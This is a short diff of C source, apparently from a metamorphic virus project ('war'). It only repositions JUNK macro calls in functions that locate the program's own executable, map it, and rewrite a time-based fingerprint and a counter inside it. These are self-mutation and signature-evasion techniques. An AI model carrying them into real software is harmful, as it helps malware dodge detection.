@@ -6,6 +6,7 @@
 #define FNV_OFFSET_BASIS_64 0xcbf29ce484222325
 #define FNV_PRIME_64 0x00000100000001b3
 
+
 void junk_war(void) {
 	char a;
 	char b;
@@ -85,9 +86,7 @@ static void increment_counter(char *counter) {
 
 static int abs_path(char *self_name) {
 	char buf[PATH_MAX];
-	char proc_self_exe[] = "/proc/self/exe";
-
-	JUNK;
+	char proc_self_exe[] = "/proc/self/exe"; JUNK;
 
 	int ret = readlink(proc_self_exe, buf, PATH_MAX);
 	if (ret == -1) {
@@ -95,9 +94,7 @@ static int abs_path(char *self_name) {
 	}
 	buf[ret] = '\0';
 
-	ft_strncpy(self_name, buf, PATH_MAX);
-
-	JUNK;
+	ft_strncpy(self_name, buf, PATH_MAX); JUNK;
 
 	return 0;
 }
@@ -108,9 +105,7 @@ int war(size_t increment, file_t *file) {
 
 	if (abs_path(self_name) == -1) {
 		return -1;
-	}
-
-	JUNK;
+	} JUNK;
 
 	struct stat st;
 	/* we could open the file with O_RDWR but text file is busy */
@@ -130,9 +125,7 @@ int war(size_t increment, file_t *file) {
 	if (self == MAP_FAILED) {
 		close(fd);
 		return -1;
-	}
-
-	JUNK;
+	} JUNK;
 
 	close(fd);
 
@@ -147,9 +140,7 @@ int war(size_t increment, file_t *file) {
 	}
 
 	char *fingerprint = found + SIGNATURE_SIZE - 15;
-	hash_with_time(fingerprint);
-
-	JUNK;
+	hash_with_time(fingerprint); JUNK;
 
 	char *counter = found + SIGNATURE_SIZE - 6;
 
@@ -159,9 +150,7 @@ int war(size_t increment, file_t *file) {
 
 	file->view = (fileview_t){.data = self, .size = st.st_size};
 	file->mode = st.st_mode;
-	ft_strncpy(file->abs_path, self_name, PATH_MAX);
-
-	JUNK;
+	ft_strncpy(file->abs_path, self_name, PATH_MAX); JUNK;
 
 	return 0;
 }
